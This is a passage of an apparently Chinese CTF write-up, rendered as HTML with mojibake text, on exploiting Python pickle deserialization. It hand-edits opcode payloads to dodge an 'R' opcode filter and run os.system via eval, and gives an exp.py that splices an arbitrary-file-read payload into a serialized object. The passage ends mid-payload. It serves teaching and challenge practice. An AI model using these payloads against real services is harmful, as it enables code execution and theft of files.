&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åæ‰‹æ“ï¼Œåœ¨è°ƒç”¨callableå‰æ·»åŠ MARKå³&lt;code>(&lt;/code>ï¼Œå»æ‰&lt;code>t&lt;/code>å’Œè°ƒç”¨&lt;code>t&lt;/code>ç”¨åˆ°çš„MARK&lt;/p>
&lt;p>ä¹Ÿå°±æ˜¯&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#39;&amp;#39;&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS&amp;#39;get&amp;#39;\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS&amp;#39;__builtins__&amp;#39;\nop5\n0(g0\ng5\nS&amp;#39;eval&amp;#39;\nop6\n0(g6\nS&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;\no.&amp;#39;&amp;#39;&amp;#39;
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥çœ‹ä¸‹åŒºåˆ«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>ä¿®æ”¹éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œ&lt;strong>æ€»ç»“ä¸€ä¸‹æ–¹æ³•å°±æ˜¯&lt;code>0gx&lt;/code>è¦å˜ä¸º&lt;code>0(gx&lt;/code>ï¼Œ&lt;code>(gx&lt;/code>è¦å˜ä¸º&lt;code>gx&lt;/code> ï¼Œ&lt;code>tR&lt;/code>æ¢æˆ&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä½¿ç”¨_getattributeload_objload_instå®ç°ä»»æ„æ–‡ä»¶è¯»å–">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>å®ç°ä»»æ„æ–‡ä»¶è¯»å–&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>ä»ç„¶ä»¥ä¸Šé¢webtmp(ç©¶æç¼åˆæ€ª)çš„é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªAnimalçš„å®ä¾‹ï¼Œç„¶åå°†nameæˆ–categoryçš„å€¼è®¾ç½®ä¸ºread wrapperçš„è¿”å›å€¼&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>å†æŠŠè¿™ä¸€éƒ¨åˆ†çš„payloadç¼åˆåˆ°åˆ›å»ºAnimalå®ä¾‹çš„Opcodeä¸­å»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åŸ: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ç¼åˆ åº”è¯¥èƒ½çœ‹å‡ºæ¥æ”¹åœ¨å“ªé‡Œäº†&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span 